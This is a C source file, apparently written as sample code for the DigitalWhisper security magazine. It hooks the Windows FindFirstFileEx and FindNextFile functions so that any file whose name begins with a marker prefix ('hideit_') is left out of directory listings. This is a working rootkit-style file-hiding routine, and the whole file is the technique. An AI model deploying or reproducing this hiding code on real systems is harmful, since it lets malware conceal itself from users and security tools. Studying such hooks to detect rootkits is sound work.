/*
	##############################################
	### (C) vbCrLf (at GMail), 2011           ####
	###     http://www.MerkazHaKfar.co.cc/    ####
	###                                       ####
	###      Written for DigitalWhisper       ####
	###    http://www.digitalwhisper.co.il/   ####
	##############################################
*/

#include "hooks.h"

DWORD originalFindFirstFileExA;
DWORD originalFindFirstFileExW;
DWORD originalFindNextFileA;
DWORD originalFindNextFileW;

HANDLE WINAPI newFindFirstFileExA(__in LPCTSTR lpFileName, __in FINDEX_INFO_LEVELS fInfoLevelId, __out LPVOID lpFindFileData, __in FINDEX_SEARCH_OPS fSearchOp, __reserved  LPVOID lpSearchFilter, __in DWORD dwAdditionalFlags)
{
	ptrFindFirstFileExA original = (ptrFindFirstFileExA)originalFindFirstFileExA;

	HANDLE handle = (original)(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	if (handle == INVALID_HANDLE_VALUE)
		return handle;

	LPWIN32_FIND_DATAA findFileData = (LPWIN32_FIND_DATAA)lpFindFileData;
	if (strstr(findFileData->cFileName, HIDE) == findFileData->cFileName) // We have to hide it!
	{
		BOOL ret = FindNextFileA(handle, findFileData);
		if (ret == 0)
			return INVALID_HANDLE_VALUE;
		else
			return handle;
	}

	return handle;
}

HANDLE WINAPI newFindFirstFileExW(__in LPCWSTR lpFileName, __in FINDEX_INFO_LEVELS fInfoLevelId, __out LPVOID lpFindFileData, __in FINDEX_SEARCH_OPS fSearchOp, __reserved  LPVOID lpSearchFilter, __in DWORD dwAdditionalFlags)
{
	ptrFindFirstFileExW original = (ptrFindFirstFileExW)originalFindFirstFileExW;

	HANDLE handle = (original)(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	if (handle == INVALID_HANDLE_VALUE)
		return handle;

	LPWIN32_FIND_DATAW findFileData = (LPWIN32_FIND_DATAW)lpFindFileData;
	if (wcsstr(findFileData->cFileName, HIDEW) == findFileData->cFileName) // We have to hide it!
	{
		BOOL ret = FindNextFileW(handle, findFileData);
		if (ret == 0)
			return INVALID_HANDLE_VALUE;
		else
			return handle;
	}

	return handle;
}

BOOL WINAPI newFindNextFileA(__in HANDLE hFindFile, __out LPWIN32_FIND_DATAA lpFindFileData)
{
	ptrFindNextFileA original = (ptrFindNextFileA)originalFindNextFileA;
	BOOL ret;
	
	do
	{
		ret = (original)(hFindFile, lpFindFileData);
	} while ((ret != 0) &&															  // While there are more files and ...
			 (strstr(lpFindFileData->cFileName, HIDE) == lpFindFileData->cFileName)); // it's starting with "hideit_"

	return ret;
}

BOOL WINAPI newFindNextFileW(__in HANDLE hFindFile, __out LPWIN32_FIND_DATAW lpFindFileData)
{
	ptrFindNextFileW original = (ptrFindNextFileW)originalFindNextFileW;
	BOOL ret;
	
	do
	{
		ret = (original)(hFindFile, lpFindFileData);
	} while ((ret != 0) &&															   // While there are more files and ...
			 (wcsstr(lpFindFileData->cFileName, HIDEW) == lpFindFileData->cFileName)); // it's starting with "hideit_"

	return ret;
}